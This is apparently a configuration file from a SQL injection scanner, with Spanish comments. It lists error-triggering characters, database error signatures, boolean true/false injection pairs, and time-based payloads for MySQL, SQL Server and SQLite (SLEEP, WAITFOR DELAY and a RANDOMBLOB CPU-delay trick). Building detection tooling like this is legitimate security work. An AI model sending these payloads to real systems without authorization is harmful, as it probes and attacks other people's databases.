# Payloads y firmas de error SQL genéricos (detección inicial, engine-agnostic)
ERROR_PAYLOADS = [
    "'", '"', "''", "`", "\\", "1'", "1\"",
]

# Firmas de error que los motores reflejan en el body de la respuesta
SQL_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlstate",
    "syntax error",
    "ora-",
    "pg::syntaxerror",
    "microsoft ole db",
    "odbc sql server driver",
    # SQLite
    "sqlite3.operationalerror",
    "sqlite_error",
    "unrecognized token",
    "no such table",
    "near \"'\"",
    "do not have the same number of result columns",
]

# Pares (TRUE, FALSE) para detección booleana.
# El primer par es generic (sin comilla), el segundo asume contexto string con comilla.
# Los pares SQLite usan la misma sintaxis que MySQL — son compatibles.
BOOLEAN_PAYLOADS = [
    # Generic / MySQL / SQLite — contexto numérico
    ("1 AND 1=1", "1 AND 1=2"),
    # Generic / MySQL / SQLite — contexto string
    ("1' AND '1'='1", "1' AND '1'='2"),
    # SQLite — usa expresiones equivalentes con comentario estándar
    ("1' AND 1=1-- -", "1' AND 1=2-- -"),
]

# Payloads de tiempo.
# MySQL usa SLEEP(N). SQLite no tiene SLEEP nativo: se simula con
# randomblob() dentro de un LIKE que fuerza trabajo de CPU.
# El umbral TIME_THRESHOLD debe ser >= el delay configurado aquí.
TIME_PAYLOADS = [
    # MySQL
    "1; SELECT SLEEP(4)-- -",
    "1' AND SLEEP(4)-- -",
    # SQL Server
    "1; WAITFOR DELAY '0:0:4'-- -",
    # SQLite — genera un bloque aleatorio grande y lo evalúa con LIKE,
    # lo que consume CPU y produce un retraso observable (~3-5s).
    "1' AND (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2))))-- -",
    "1 AND (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2))))-- -",
]

TIME_THRESHOLD = 3.5  # segundos